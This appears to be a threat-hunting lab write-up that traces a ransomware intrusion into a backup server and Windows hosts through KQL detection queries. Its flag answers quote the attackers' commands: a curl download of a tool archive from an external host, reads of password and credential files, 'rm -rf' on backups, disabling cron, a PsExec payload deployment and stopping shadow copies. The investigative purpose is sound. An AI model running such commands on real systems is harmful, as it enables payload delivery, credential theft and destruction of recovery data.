### SITUATION: 
It's been a week since the initial compromise. You arrive Monday morning to find ransom notes across every system. The threat actors weren't just stealing data - they were preparing for total devastation.

Your CEO needs answers:

  - How did they get to our backup infrastructure?

  - What exactly did they destroy?

  - How did the ransomware spread so fast?

  - Can we recover?
---

### PHASE 1: LINUX BACKUP SERVER COMPROMISE (FLAGS 1-12)
---

#### FLAG 1: LATERAL MOVEMENT - Remote Access
Attackers pivot to critical infrastructure to eliminate recovery options before deploying ransomware.

Query used: 

The query used detects user-initiated SSH activity on endpoints whose hostname contains “azuki” within a defined investigation window. It focuses on interactive SSH executions (for example, user@host) while excluding system and service accounts, making it suitable for identifying potential remote access or lateral movement performed by real users.

```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated   between (datetime(2025-11-23) .. datetime(2026-01-04))
| where ProcessCommandLine has_any ("ssh", "@")
| where AccountName !in ("system", "local service", "")
| where AccountDomain != " "
| project TimeGenerated, AccountDomain, AccountName, ProcessCommandLine, ProcessCreationTime
```
This is commonly used to:
  - Investigate remote access
  - Detect lateral movement
  - Validate whether SSH usage is expected or suspicious

#### Detection Logic
  - Filters process events to a specific host set (DeviceName contains "azuki").
  - Limits results to a defined time range for focused investigation.
  - Identifies SSH-related executions by matching ssh and @ in the command line.
  - Excludes system and service accounts to retain interactive user activity.
  - Projects identity, timing, and execution fields required for analysis and correlation.

#### Investigative value
  - Helps identify unexpected or unauthorized SSH usage on internal systems.
  - Useful for investigating lateral movement, remote administration abuse, or credential compromise.
  - Provides clear attribution (user and domain) and timing, enabling analysts to pivot into network logs, authentication events, and destination hosts for deeper investigation.

#### MITRE ATT&CK mapping

T1021.004 – Remote Services: SSH
  - Explicit detection of SSH execution
  - User-context activity (user@host)
  - Common for lateral movement and remote administration


Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De1.png)

*Question: What remote access command was executed from the compromised workstation?*

```
"ssh.exe" backup-admin@10.1.0.189
```

#### FLAG 2: LATERAL MOVEMENT - Attack Source
Identifying the attack source enables network segmentation and containment.

Query used:

The query  used detects network connections from a specific endpoint (“azuki”) to a known internal IP address (10.1.0.189) within a defined time window. It provides visibility into process-driven network activity, helping identify which processes initiated communication with that host.

```
DeviceNetworkEvents
| where DeviceName contains "azuki"
| where TimeGenerated   between (datetime(2025-11-23) .. datetime(2026-01-04))
| where RemoteIP == "10.1.0.189"
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, InitiatingProcessVersionInfoFileDescription, LocalIP
```
#### Common use
  - Investigating suspected lateral movement to an internal system
  - Validating whether connections to a specific server or workstation are expected
  - Correlating process execution with network activity during an incident
  - Supporting threat-hunting scenarios where an IP has been flagged as suspicious

#### Detection Logic
  - Filters network events to devices whose hostname contains “azuki”.
  - Restricts results to a defined investigation timeframe.
  - Matches only connections where the remote IP equals 10.1.0.189.
  - Projects key fields to show:
    - When the connection occurred
    - What action was taken (connection allowed, blocked, etc.)
    - The initiating process and its command line
    - The local IP used by the endpoint

#### Investigative value
  - Identifies which process initiated the network connection, aiding attribution.
  - Helps determine whether the activity aligns with legitimate administrative access or potential misuse.
  - Enables analysts to pivot into:
    - Process creation events on the source host
    - Authentication or service logs on the destination host
    - Additional network telemetry for lateral movement analysis

#### MITRE ATT&CK Mapping
  - T1021 – Remote Services
    - Applicable when the connection supports remote access or administration.
  - T1046 – Network Service Discovery
    - Relevant if the activity is part of internal probing or enumeration.
  - T1071 – Application Layer Protocol
    - Network communication over standard protocols initiated by a process.


Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De2.png)

*Question: What IP address initiated the connection to the backup server?*

```
10.1.0.108
```

#### FLAG 3: CREDENTIAL ACCESS - Compromised Account

Administrative accounts with backup privileges provide access to critical recovery infrastructure.

Query used:

This query is used to detect user-initiated SSH activity on the host azuki-backupsrv within a defined investigation window. It focuses on interactive SSH executions (for example, user@host) and excludes system and service accounts to highlight potential remote access or lateral movement involving real user accounts.

```
DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where TimeGenerated   between (datetime(2025-11-23) .. datetime(2026-01-04))
| where ProcessCommandLine has_any ("ssh", "@")
| where AccountName !in ("system", "local service", "")
| where AccountDomain != " "
| project TimeGenerated, AccountDomain, AccountName, ProcessCommandLine, ProcessCreationTime

```

#### Common use
  - Investigating remote access to backup servers, which are typically high-value assets
  - Identifying unexpected SSH usage outside of standard backup or maintenance workflows
  - Supporting lateral movement analysis following initial access on another host
  - Validating whether user access aligns with approved administrative activity

#### Detection Logic
  - Filters process creation events to the host azuki-backupsrv.
  - Limits results to a specific investigation timeframe.
  - Detects SSH-related executions by matching ssh and @ in the command line.
  - Excludes system, service, and empty account names to retain interactive user context.
  - Projects key timing, identity, and execution fields for analysis and correlation.

#### Investigative value
  - Highlights who accessed the backup server and when, aiding accountability.
  - Helps determine whether SSH access to a critical server is legitimate or suspicious.
  - Provides pivot points into:
    - Network connections initiated by the same process
    - Authentication logs on azuki-backupsrv
    - File or backup-related activity following access

#### MITRE ATT&CK Mapping
  - T1021.004 – Remote Services: SSH
    - Primary technique, as the query explicitly detects SSH usage.
  - T1078 – Valid Accounts
    - SSH access implies the use of legitimate credentials.
  - T1059 – Command and Scripting Interpreter
    - SSH commonly serves as a channel for remote command execution.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De3.png)

*Question: What account was used to access the backup server?*
```
backup-admin
```

#### FLAG 4: DISCOVERY - Directory Enumeration
File system enumeration reveals backup locations and valuable targets for destruction.

Query used:

The query used detects execution of the ls command by the backup-admin account on devices whose hostname contains “azuki” during a defined investigation window. It focuses on post-authentication command execution, which may indicate interactive shell activity following remote access.

```
DeviceProcessEvents
| where DeviceName contains "azuki"
| where TimeGenerated   between (datetime(2025-11-23) .. datetime(2026-01-04))
| where AccountName == "backup-admin"
| where FileName == "ls"
| project TimeGenerated, AccountName, ProcessCommandLine, ProcessCreationTime
| order by TimeGenerated asc  
```
#### Common use
  - Validating what actions were taken after SSH access by a privileged or service-related account
  - Investigating post-compromise activity on systems related to backups
  - Confirming whether command execution aligns with legitimate administrative tasks
  - Supporting timeline reconstruction during an incident

#### Detection Logic
  - Filters process events to hosts containing “azuki”.
  - Restricts results to the defined investigation timeframe.
  - Matches activity specifically to the backup-admin account.
  - Detects execution of the ls binary, commonly used for directory listing and environment discovery.
  - Orders results chronologically to show the command execution sequence.

#### Investigative value
  - Helps determine what the account did after gaining access.
  - Indicates interactive shell behavior, often seen after SSH logon.
  - Provides context to correlate with:
  - Prior SSH access events
  - Subsequent file access or modification
  - Network connections to or from the host

#### MITRE ATT&CK Mapping
  - T1083 – File and Directory Discovery
    - ls is commonly used to enumerate files and directories.
  - T1059 – Command and Scripting Interpreter
    - Execution of shell commands in an interactive session.
  - T1078 – Valid Accounts
    - Activity performed using a legitimate account (backup-admin).

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De4a.png)

*Question: What command listed the backup directory contents?*
```
ls --color=auto -la /backups/
```

####  FLAG 5: DISCOVERY - File Search
Attackers search for specific file types to identify high-value targets.

Query used:

The query used detects execution of the find command by the backup-admin account on devices whose hostname contains “azuki” within a defined investigation window. It highlights file system searching and enumeration activity, often associated with post-access discovery.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where AccountName == "backup-admin"
| where ProcessCommandLine has "find"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
```
#### Common use
  - Investigating what files or directories a privileged account searched for
  - Identifying post-compromise discovery activity following remote access
  - Validating whether file search behavior aligns with legitimate backup or administrative tasks
  - Supporting deeper forensic timelines during incident response

#### Detection Logic
  - Filters process creation events to hosts containing “azuki”.
  - Restricts results to the defined timeframe.
  - Matches activity performed specifically by the backup-admin account.
  - Detects commands where the command line includes find, indicating file or directory searches.
  - Project's key execution details needed for investigation.

#### Investigative value
  - Indicates active file system discovery, often a precursor to data access or exfiltration.
  - Helps identify what the account may have been looking for.
  - Enables correlation with:
  - Previous SSH access
  - Directory listing (ls) activity
  - Subsequent file access, compression, or network transfer events
#### MITRE ATT&CK Mapping
  - T1083 – File and Directory Discovery
    - Primary technique, as find is commonly used for file system enumeration.
  - T1059 – Command and Scripting Interpreter
    - Execution of shell commands in an interactive session.
  - T1078 – Valid Accounts
    - Activity performed using a legitimate account (backup-admin).

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De5.png)

*Question: What command searched for backup archives?*
```
find /backups -name *.tar.gz
```


####  FLAG 6: DISCOVERY - Account Enumeration
Attackers enumerate local accounts to understand the system's user base.

Query used:

The query used detects execution of the cat command by non-root users on the host azuki-backupsrv within a defined investigation window. It highlights file content access, which may indicate data review, credential harvesting, or sensitive file inspection on a critical backup server.

```
DeviceProcessEvents 
| where DeviceName contains "azuki-backupsrv" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where AccountName !="root"
| where ProcessCommandLine has "cat"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine

```
#### Common use
  - Investigating which files were read after access to a backup server
  - Identifying non-privileged user activity involving file contents
  - Detecting potential credential or configuration file exposure
  - Supporting analysis of post-access or post-compromise behavior

#### Detection Logic
  - Filters process creation events to the host azuki-backupsrv.
  - Restricts results to the defined investigation timeframe.
  - Excludes the root account to focus on non-root user activity.
  - Detects commands where the command line includes cat, indicating file content reading.
  - Projects relevant execution details for analysis

#### Investigative value
  - Helps identify what files were accessed and when.
  - High signal when:
    - Sensitive paths are referenced (e.g., /etc/passwd, /etc/shadow, backup configs)
    - Activity follows SSH access or discovery commands
  - Enables pivots into:
    - File access patterns
    - Subsequent privilege escalation attempts
    - Data staging or exfiltration activity

#### MITRE ATT&CK Mapping
  - T1005 – Data from Local System
    - Reading file contents directly from the local system.
  - T1059 – Command and Scripting Interpreter
    - Execution of shell commands.
  - T1078 – Valid Accounts
    - Activity performed using legitimate (non-root) credentials.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De6.png)

*Question: What command enumerated local accounts?*

```
cat /etc/passwd
```

#### FLAG 7: DISCOVERY - Scheduled Job Reconnaissance
Understanding backup schedules helps attackers time their destruction for maximum impact.

Query used:

The query used detects file content access via the cat command by non-root users on the host azuki-backupsrv during the specified investigation window. It focuses on post-access activity involving direct reading of files on a backup server.

```
DeviceProcessEvents 
| where DeviceName contains "azuki-backupsrv" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where AccountName !="root"
| where ProcessCommandLine has "cat"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine

```
#### Common use
  - Investigating non-root user access to files on sensitive systems
  - Identifying post-compromise data inspection activity
  - Validating whether file reads align with legitimate backup or maintenance tasks
  - Supporting forensic reconstruction of user actions after SSH access

#### Detection Logic
  - Filters process creation events to azuki-backupsrv.
  - Restricts results to the defined timeframe.
  - Excludes the root account to highlight non-privileged user behavior.
  - Matches command lines containing cat, indicating direct file content reading.
  - Projects key execution details needed for investigation.

#### Investigative value
  - Provides visibility into what files were read and when.
  - High investigative value when combined with:
    - Prior SSH login activity
    - File and directory discovery commands (ls, find)
  - Useful for detecting credential harvesting, configuration review, or sensitive data exposure.

#### MITRE ATT&CK Mapping
  - T1005 – Data from Local System
    - Direct access to file contents on the local system.
  - T1059 – Command and Scripting Interpreter
    - Execution of shell commands.
  - T1078 – Valid Accounts
    - Activity performed using legitimate but non-root credentials.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De7.png)

*Question: What command revealed scheduled jobs on the system?*

```
cat /etc/crontab
```

#### FLAG 8: COMMAND AND CONTROL - Tool Transfer
Attackers download tools from external infrastructure to carry out the attack.

Query used:

The query used detects use of file retrieval utilities (curl or wget) on the host azuki-backupsrv within a defined investigation window. It highlights outbound file download or data transfer activity, which may indicate tool staging, payload retrieval, or data exfiltration preparation on a backup server.

```
DeviceProcessEvents 
| where DeviceName contains "azuki-backupsrv" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine has_any ("curl", "wget")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
```
#### Common use
  - Identifying the download of tools or scripts after initial access
  - Detecting post-compromise payload staging
  - Investigating potential data exfiltration attempts
  - Validating whether internet or internal downloads align with approved maintenance activity

#### Detection Logic
  - Filters process creation events to the host azuki-backupsrv.
  - Restricts results to the defined timeframe.
  - Detects command lines containing curl or wget, common utilities for HTTP/HTTPS-based transfers.
  - Projects execution details needed to understand what was retrieved and how.

#### Investigative value
  - Strong signal of post-access progression, especially following discovery commands.
  - Helps determine:
    - What external or internal resources were contacted
    - Whether files were staged for execution or exfiltration
  - Enables correlation with:
    - Network events (destination IPs/domains)
    - File creation or modification events
    - Subsequent process execution
#### MITRE ATT&CK Mapping
  - T1105 – Ingress Tool Transfer:
    - Downloading tools or payloads using curl or wget.
  - T1071 – Application Layer Protocol
    - Data transfer over standard application-layer protocols.
  - T1059 – Command and Scripting Interpreter
    - Command execution in an interactive shell context.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De8.png)

*Question: What command downloaded external tools?*
```
curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z
```

#### FLAG 9: CREDENTIAL ACCESS - Credential Theft
Backup servers often store sensitive configuration files containing credentials.

```
DeviceProcessEvents 
| where DeviceName contains "azuki-backupsrv" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where AccountName !="root"
| where ProcessCommandLine has "cat /backups"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine

```

#### Common use
  - Investigating access to sensitive backup repositories
  - Identifying non-privileged user interaction with backup data
  - Detecting potential data exposure or misuse of backup contents
  - Supporting analysis of post-compromise objectives, such as data collection

#### Detection Logic
  - Filters process creation events to azuki-backupsrv.
  - Restricts results to the defined timeframe.
  - Excludes the root account to focus on non-privileged user activity.
  - Matches command lines containing cat /backups, indicating attempted reading of backup-related files.
  - Projects key execution details for investigation.

#### Investigative value
  - High-value signal because backup directories often contain sensitive or complete datasets.
  - Helps determine:
    - Whether backup contents were directly accessed
    - Which user account performed the action
  - Provides strong context when correlated with:
    - Prior SSH access
    - Discovery commands (ls, find)
    - Download or transfer activity (curl, wget)

### MITRE ATT&CK Mapping
  - T1005 – Data from Local System
    - Accessing data stored locally on the system.
  - T1039 – Data from Network Shared Drive (contextual, if backups are mounted shares)
  - T1078 – Valid Accounts
    - Activity performed using legitimate but non-root credentials.


Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De9.png)

*Question: What command accessed stored credentials?*
```
cat /backups/configs/all-credentials.txt
```

#### FLAG 10: IMPACT - Data Destruction
Destroying backups eliminates recovery options and maximises ransomware impact.

Query used:

This query is used to detect potential destructive activity targeting backup data on the host azuki-backupsrv. It focuses on commands associated with file deletion, particularly those referencing backup directories, which may indicate data destruction, impact operations, or anti-recovery behavior.

```
DeviceProcessEvents 
| where DeviceName contains "azuki-backupsrv" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine has_any ("rm -rf", "backups")
| where FileName !in ("ls", "cat")
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```
#### Common use
Investigating suspected backup tampering or deletion
Detecting destructive actions following unauthorized access
Identifying attempts to impair recovery capabilities
Supporting incident response for ransomware or insider threat scenarios

#### Detection Logic
  - Filters process creation events to azuki-backupsrv.
  - Restricts results to the defined investigation timeframe.
  - Detects command lines containing:
    - rm -rf (recursive, forceful deletion)
    - backups (targeting backup-related paths)
  - Excludes benign file listing and reading commands (ls, cat) to reduce noise.
  - Projects user, host, and command-line details for investigation.

#### Investigative value
  - Very high signal due to irreversible or high-impact actions.
  - Helps determine:
    - Who attempted to delete backup data
    - What commands were used and when
  - Critical for:
    - Assessing impact severity
    - Deciding on containment and recovery actions
  - Strong correlation point with:
    - Prior access and discovery activity
    - Ransomware or extortion-related behavior

#### MITRE ATT&CK Mapping
  - T1485 – Data Destruction
    - Deletion of data to cause impact.
  - T1490 – Inhibit System Recovery
    - Targeting backups to prevent restoration.
  - T1070.004 – Indicator Removal on Host 
    - Deleting data to remove evidence.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De10.png)

*Question: What command destroyed backup files?*
```
rm -rf /backups/config-backups/*
```

#### FLAG 11: IMPACT - Service Stopped
Stopping services takes effect immediately but does NOT survive a reboot.

Query used:

The query is used detects service stoppage activity executed by the root account on the host azuki-backupsrv within the specified investigation window. It highlights intentional stopping of system services, which may indicate defense evasion, service disruption, or preparation for destructive actions.

```
DeviceProcessEvents 
| where DeviceName contains "azuki-backupsrv" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine has_any ("systemctl stop")
| where AccountName == "root"
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```
#### Common use
  - Investigating service tampering on critical servers
  - Detecting attempts to disable backup, security, or monitoring services
  - Supporting analysis of pre-impact or impact-stage activity
  - Validating whether service stoppages align with approved maintenance windows

#### Detection Logic
  - Filters process creation events to azuki-backupsrv.
  - Restricts results to the defined timeframe.
  - Matches command lines containing systemctl stop, indicating manual service termination.
  - Limits results to actions performed by the root account.
  - Projects key identity, host, and command-line details for investigation.

#### Investigative value
  - High signal when observed outside change windows or in conjunction with:
    - Backup deletion attempts
    - File discovery and data access
  - Helps determine:
    - Which services were stopped
    - Whether this enabled further destructive or evasive activity
  - Critical for assessing operational impact and containment needs

#### MITRE ATT&CK Mapping
  -T1489 – Service Stop
    - Primary technique, as services are deliberately stopped.
  - T1562 – Impair Defenses 
    - If security or monitoring services are targeted.
  - T1490 – Inhibit System Recovery 
    - If backup-related services are disabled.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De11a.png)

*Question: What command stopped the backup service?*
```
systemctl stop cron
```

#### FLAG 12: IMPACT - Service Disabled

Disabling a service prevents it from starting at boot - this SURVIVES a reboot.

Query used:

This query is used to detect persistent service disablement performed by the root account on the host azuki-backupsrv within the defined investigation window. Unlike stopping a service temporarily, disabling a service prevents it from starting on reboot, indicating longer-term impact, defense evasion, or recovery inhibition.

```
DeviceProcessEvents 
| where DeviceName contains "azuki-backupsrv" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine has "systemctl disable"
| where AccountName == "root"
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```
#### Common use
  - Investigating persistence or impact actions on critical infrastructure
  - Detecting permanent disablement of backup, security, or monitoring services
  - Supporting ransomware, extortion, or destructive attack investigations
  - Verifying whether service disablement aligns with approved system changes

#### Detection Logic
  - Filters process creation events to azuki-backupsrv.
  - Restricts results to the defined timeframe.
  - Matches command lines containing systemctl disable, indicating service persistence modification.
  - Limits results to actions performed by the root account.
  - Projects identity, host, and command-line details for analysis.

#### Investigative value
  - Very high signal due to long-term operational impact.
  - Helps determine:
    - Which services were permanently disabled
    - Whether system hardening or recovery mechanisms were undermined
  - Critical for:
    - Assessing the scope of damage
    - Planning remediation and service restoration
Strong indicator when correlated with:
    - Backup deletion
    - Service stoppage
    - Data access activity

#### MITRE ATT&CK Mapping
  - T1489 – Service Stop (related)
    -Disabling services often follows stopping them.
  - T1543 – Create or Modify System Process
    - Modifying service configuration for persistence or impact.
  - T1490 – Inhibit System Recovery
    - Preventing critical services from starting after reboot.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De12.png)

*Question: What command permanently disabled the backup service?*
```
systemctl disable cron
```
---

### PHASE 2: WINDOWS RANSOMWARE DEPLOYMENT (FLAGS 13-15)
---

####  FLAG 13: LATERAL MOVEMENT - Remote Execution

Remote administration tools enable attackers to deploy malware across multiple systems simultaneously.

Query used:

The query used detects PsExec execution initiated via PowerShell by non-system accounts on devices whose hostname contains “azuki” within the specified investigation window. It highlights remote command execution tooling, often associated with lateral movement or administrative pivoting.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where InitiatingProcessCommandLine contains "powershell"
| where AccountName != "system"
| where ProcessCommandLine contains "Psexec64.exe" 
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
```
#### Common use
  - Investigating lateral movement using PsExec
  - Detecting remote execution initiated from scripts or interactive PowerShell sessions
  - Identifying abuse of legitimate administrative tools
  - Supporting investigations into credential reuse or compromised admin accounts

#### Detection Logic
  - Filters process events to devices containing “azuki” in the hostname.
  - Restricts results to the defined timeframe.
  - Ensures the initiating process command line contains PowerShell, indicating scripted or interactive invocation.
  - Excludes system to focus on user-driven activity.
  - Detects execution of Psexec64.exe, a well-known remote administration tool.
  - Projects identity, host, and execution context for investigation.

#### Investigative value
  - Strong indicator of lateral movement, especially outside IT admin workflows.
  - Helps determine:
    - Which account executed PsExec
    - Whether PowerShell was used as an orchestration layer
  - Enables pivots into:
    - Target host activity
    - SMB / service creation events
    - Credential use and authentication logs

#### MITRE ATT&CK Mapping
  - T1021.002 – Remote Services: SMB/Windows Admin Shares
      PsExec uses SMB for remote execution.
  - T1569.002 – System Services: Service Execution
      PsExec creates a temporary service on the remote host.
  - T1059.001 – Command and Scripting Interpreter: PowerShell
      PowerShell used to launch PsExec.
  - T1078 – Valid Accounts
      PsExec requires valid credentials.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De13.png)

*Question: What tool executed commands on remote systems?*

```
PsExec64.exe
```
#### FLAG 14: LATERAL MOVEMENT - Deployment Command

Full command lines reveal target systems, credentials, and deployed payloads.

Query used:

This query is used to detect execution of Psexec64.exe initiated via PowerShell by non-system accounts on devices containing “azuki” in their hostname during the specified timeframe. It focuses on remote administrative or lateral movement activity launched from PowerShell sessions.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where InitiatingProcessCommandLine contains "powershell"
| where AccountName != "system"
| where ProcessCommandLine contains "Psexec64.exe" 
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```
#### Common use
  - Identifying lateral movement attempts using PsExec
  - Detecting remote execution initiated via PowerShell scripts
  - Investigating unauthorized administrative tool usage
  - Supporting post-compromise investigations for credential abuse and network pivoting

#### Detection Logic
  - Filters process events to devices containing “azuki”.
  - Restricts results to a specific investigation window.
  - Ensures the initiating process is PowerShell (InitiatingProcessCommandLine contains "powershell").
  - Excludes the system account to focus on user-driven activity.
  - Matches command lines containing Psexec64.exe.
  - Projects key fields for user, device, and execution context.

#### Investigative value
Highlights high-risk lateral movement tools in use.
Helps determine which accounts are performing remote execution.
Supports pivoting into:
    -Target host process events
    - SMB connections and authentication events
    - Potential service creation or malicious payload execution

#### MITRE ATT&CK Mapping
  - T1021.002 – Remote Services: SMB/Windows Admin Shares
      - PsExec uses SMB for remote execution.
  - T1569.002 – System Services: Service Execution
      - PsExec installs temporary services to execute remotely.
  - T1059.001 – Command and Scripting Interpreter: PowerShell
      - PowerShell used as the orchestration layer.
  - T1078 – Valid Accounts
      - Requires legitimate credentials to execute remotely.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De14.png)

*Question: What is the full deployment command?*
```
"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
```

#### FLAG 15: EXECUTION - Malicious Payload
Identifying the payload enables threat hunting across the environment.

Query used:

This query is used to detect execution of silentlynx.exe initiated via PowerShell on devices whose hostname contains “azuki” during the specified investigation window. It focuses on potential post-exploitation tooling or malicious payload execution launched from PowerShell sessions.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where InitiatingProcessCommandLine contains "powershell"
| where ProcessCommandLine contains "silentlynx.exe" 
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```
#### Common use
  - Detecting malware execution or post-compromise tools
  - Identifying PowerShell-orchestrated attacks
  - Investigating unauthorized or suspicious binaries running on endpoints
  - Supporting incident response and threat hunting for lateral movement or persistence tools

#### Detection Logic
  - Filters process events to devices containing “azuki”.
  - Restricts results to a defined investigation timeframe.
  - Ensures the initiating process is PowerShell (InitiatingProcessCommandLine contains "powershell").
  - Matches execution of silentlynx.exe, which is often a malicious or unauthorized tool.
  - Projects user, device, process name, and command-line details for analysis.

#### Investigative value
  - Strong signal of potential post-compromise activity.
  - Helps determine:
      - Which account executed the tool
      - When it ran and on which device
  - Supports correlation with:
      - Prior lateral movement activity (SSH or PsExec)
      - File discovery or exfiltration attempts
      - Other suspicious PowerShell-driven executions

#### MITRE ATT&CK Mapping
  - T1059.001 – Command and Scripting Interpreter: PowerShell
      - Execution orchestrated via PowerShell.
  - T1569.002 – System Services: Service Execution (if silentlynx.exe creates services)
      - Remote or local service execution may be leveraged.
  - T1071 – Application Layer Protocol (if tool communicates externally)
      - Post-exploitation tools often use network protocols.
  - T1078 – Valid Accounts (if run by a legitimate user for lateral movement)


Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De15.png)

*Question: What payload was deployed?*
```
silentlynx.exe
```
---

### PHASE 3: RECOVERY INHIBITION (FLAGS 16-22)

---

####  FLAG 16: IMPACT - Shadow Service Stopped

Query used:

The query used detects Volume Shadow Copy Service (VSS)–related command execution by the user kenji.sato on devices whose hostname contains “azuki” within the specified investigation window. It focuses on interaction with shadow copies, which are commonly targeted to access or tamper with backups and recovery data.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine contains "VSS" 
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```
#### Common use
Investigating backup and recovery manipulation
Detecting attempts to access or interfere with shadow copies
Supporting ransomware or pre-impact activity analysis
Validating whether VSS-related actions were authorized administrative tasks

#### Detection Logic
Filters process creation events to devices containing “azuki”.
Restricts results to the defined timeframe.
Matches command lines containing VSS, indicating interaction with Volume Shadow Copy mechanisms.
Limits activity to the specific user account kenji.sato.
Projects execution and initiation context for investigation.

#### Investigative value
  - High signal because VSS is critical for system recovery.
  - Helps determine:
      - Whether shadow copies were queried, modified, or deleted
      - If the activity aligns with other destructive or evasive behavior
  - Strong when correlated with:
      - Backup deletion attempts
      - Service stoppage or disablement
      - Lateral movement or privilege abuse

#### MITRE ATT&CK Mapping
  - T1490 – Inhibit System Recovery
    - VSS manipulation is a common method to prevent system restoration.
  - T1070.004 – Indicator Removal on Host (contextual)
    - Shadow copy deletion can remove forensic artifacts.
  - T1059 – Command and Scripting Interpreter
    - VSS commands are typically executed via command-line tools.


Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De16.png)

*Question: What command stopped the shadow copy service?*
```
"net" stop VSS /y
```

#### FLAG 17: IMPACT - Backup Engine Stopped
Stopping backup engines prevents backup operations during the attack.

Query used: 

This query is used to detect execution of Windows net commands by the user kenji.sato on devices whose hostname contains “azuki” during the specified investigation window. It focuses on network, user, and service-related command usage, which is commonly associated with account enumeration, service manipulation, or lateral movement preparation.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine contains '"net"' 
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```

#### Common use
  - Investigating account and group enumeration activity
  - Detecting network share or service discovery
  - Supporting analysis of post-compromise reconnaissance
  - Validating whether net command usage aligns with legitimate administrative tasks

#### Detection Logic
  - Filters process creation events to hosts containing “azuki”.
  - Restricts results to the defined timeframe.
  - Matches command lines containing "net", indicating use of Windows networking commands (e.g., net user, net group, net share, net use).
  - Limits activity to the user account kenji.sato.
  - Projects execution and initiation context for investigation.

#### Investigative value
  - Strong signal of environment discovery when observed outside normal admin workflows.
  - Helps determine:
    - Whether the user enumerated accounts, groups, or shares
    - If the activity preceded lateral movement or credential abuse
  - Enables correlation with:
    - PsExec or PowerShell-based lateral movement
    - Authentication attempts
    - Access to network shares or remote systems

#### MITRE ATT&CK Mapping
  - T1087 – Account Discovery
    - net user and net group are commonly used for account enumeration.
